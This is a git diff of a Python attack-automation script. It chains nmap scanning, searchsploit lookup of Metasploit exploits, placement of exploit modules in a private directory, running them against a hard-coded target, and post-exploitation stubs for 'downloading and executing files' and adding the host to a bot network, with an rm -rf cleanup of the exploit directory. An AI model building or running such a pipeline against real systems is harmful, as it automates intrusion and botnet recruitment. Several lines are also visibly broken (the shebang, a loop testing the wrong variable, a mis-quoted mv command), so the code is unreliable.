@@ -1,4 +1,4 @@
-#!/usr/bin/python
+#/usr/bin/python3
 # -*- coding: utf-8 -*- 
 import subprocess
 import os
@@ -10,9 +10,13 @@ hosts = ['10.10.10.2']
 intensity = 'Loud'
 
 #global variables for debugging
-#nmap doesnt need to be run every time for testing:
+#some things don't need to be run every time for testing:
 nmap_debug = 1
-search_debug = 0
+search_debug = 1
+post_debug = 1
+
+#msf needs its own special directory, goes here for now
+msf_exploit_dir = '/root/.msf4/modules/exploits/private/'
 
 #host object holds information about a target
 class Host:
@@ -24,7 +28,7 @@ class Host:
         self.hostname = hostname
         self.scanxml = hostname + '.xml'
         self.exploits_file = hostname + '.json'
-        self.exploits = None
+        self.exploits = []
 #has a flexible network scanner and parses data
 #to format which is useful for metasploit
 class NetworkScanner:
@@ -80,18 +84,45 @@ class DatabaseFind:
                 fi.write(str(host.exploits))
         else:
             pass
-        self.output_to_json(host.exploits_file)
+        self.output_to_json(host)
         return 0
 
-    def output_to_json(self, file_name):
+    def output_to_json(self, host):
         #make the output into usable json
         data_json = []
-        with open(file_name, 'r') as fi:
+        with open(host.exploits_file, 'r') as fi:
             data = '\n'.join(fi.read().splitlines()[2:])
             for exp in data.split('\n\n\n'):
                 data_json.append(json.loads(exp))
         for i in data_json: 
-            if len(i['RESULTS_EXPLOIT']): print(i['RESULTS_EXPLOIT'][0]['Title'])
+            if len(i['RESULTS_EXPLOIT']):
+                for exp in i['RESULTS_EXPLOIT']:
+                    if 'Metasploit' in exp['Title']: 
+                        #print('\n[*]EXPLOIT FOUND: ' + str(exp))
+                        host.exploits.append(exp)
+            if len(i['RESULTS_SHELLCODE']): 
+                for shell in i['RESULTS_SHELLCODE']:
+                    if 'Metasploit' in exp['Title']: 
+                        print('[*]SHELLCODE FOUND: ' + str(shell))
+        self.choose_exploits(host)
+    
+    def choose_exploits(self, host):
+        #pick the exploit to use
+        #for now this will be hard-coded to use one exploit
+        exploits = []
+        if not (os.path.exists(msf_exploit_dir)):
+            print('path not here!')
+            os.makedirs(msf_exploit_dir)
+        for exploit in host.exploits:
+            if exploit['EDB-ID'] == '16921':
+                ssquery = "searchsploit -m " + exploit['EDB-ID']
+                ssproc = subprocess.Popen(
+                    ssquery.split(),
+                    stdout = subprocess.PIPE)
+                sys.stdout.flush()
+                ssproc.communicate()
+        mv_cmd = '"mv /root/reu/*.rb" ' + msf_exploit_dir
+        subprocess.call(mv_cmd.split())
 
 #actually run the exploit against the target
 class Exploit:
@@ -114,6 +145,8 @@ class PostExploitation:
     def load_files(self):
         print('[+]Downloading and executing files.')
         print('[+]Host added to network.')
+        if(not post_debug):
+            subprocess.Popen(['rm','-rf',msf_exploit_dir])
 
 class BotController:
 
